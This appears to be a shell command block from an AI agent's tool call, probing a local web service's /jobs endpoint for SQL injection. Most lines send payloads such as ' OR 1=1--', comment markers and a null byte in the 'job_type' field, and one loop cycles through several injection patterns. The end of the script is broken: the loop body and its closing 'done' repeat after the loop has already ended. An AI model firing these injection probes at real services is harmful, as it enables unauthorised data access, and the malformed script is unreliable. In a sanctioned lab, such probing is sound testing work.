input.command:
curl -s -X POST http://localhost:44719/jobs -H "Content-Type: application/json" -d "{\"job_type\": \"back-end\\\" OR 1=1--\"}"
echo "---"
curl -s -X POST http://localhost:44719/jobs -H "Content-Type: application/json" -d "{\"job_type\": \"back-end OR 1\"}"
echo "---"
curl -s -X POST http://localhost:44719/jobs -H "Content-Type: application/json" -d "{\"job_type\": \"back-end--\"}"
echo "---"
# Check for URL endpoints
curl -s http://localhost:44719/jobs
echo "---"
curl -s http://localhost:44719/openapi.json | head -200

# Try common SQL injection patterns
for payload in "back-end'--" "back-end\"--" "back-end')--" "back-end /*" "back-end%00" "back-end|" "back-end#" "back-end;"; do
  echo "=== $payload ==="
  curl -s -X POST http://localhost:44719/jobs -H "Content-Type: application/json" --data-raw "{\"job_type\": \"$payload\"}"
  echo
done

  echo "=== $payload ==="
  curl -s -X POST http://localhost:44719/jobs -H "Content-Type: application/json" --data-raw "{\"job_type\": \"$payload\"}"
  echo
done
